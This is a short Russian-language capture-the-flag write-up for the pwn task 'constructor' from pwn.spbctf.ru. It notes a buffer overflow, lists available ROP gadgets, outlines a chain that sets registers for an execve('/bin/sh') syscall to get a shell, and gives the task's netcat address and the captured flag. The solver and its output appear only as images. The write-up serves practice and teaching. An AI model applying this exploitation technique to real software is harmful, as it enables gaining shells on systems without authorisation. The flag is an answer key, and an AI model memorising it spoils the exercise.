[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn3_constructor)
Описание:
В дестве все мы любили конструкторы...
`nc 109.233.56.90 11634`
**[constructor.elf](https://pwn.spbctf.ru/files/aslr/constructor/constructor.elf)**

Имеется уязвимость переполнения буфера, необходимо составить ROP-цепочку.
![{EA321EF2-A941-4E82-9CE0-93A718A83A17}](../../../../z.%20Images/{EA321EF2-A941-4E82-9CE0-93A718A83A17}.png)

Имеющиеся гаджеты:
1. `xchg    rdx, rdi`
2. `xchg    rdx, rsi`
3. `pop     rdx`
4. `mov     rax, 59`
5. `syscall`

Для получения шела необходимо выполнить `syscall`, `rdi = bin/sh` addr, `rsi = 0`, `rdx = 0`, `rax = 59`.
Код:
``` nasm
pop rax (59)
pop rdx (0)
xchg rdx, rsi
pop rdx (bin_sh)
xchg rdx, rdi
pop rdx (0)
syscall
```

Солвер:
![Pasted image 20260325103042](../../../../z.%20Images/Pasted%20image%2020260325103042.png)

Запуск:
![{68A1522B-5728-4EF9-94E2-B79C7A334E60}](../../../../z.%20Images/{68A1522B-5728-4EF9-94E2-B79C7A334E60}.png)

Ответ: `spbctf{30a74f820c78437288434ae9a10d7926}`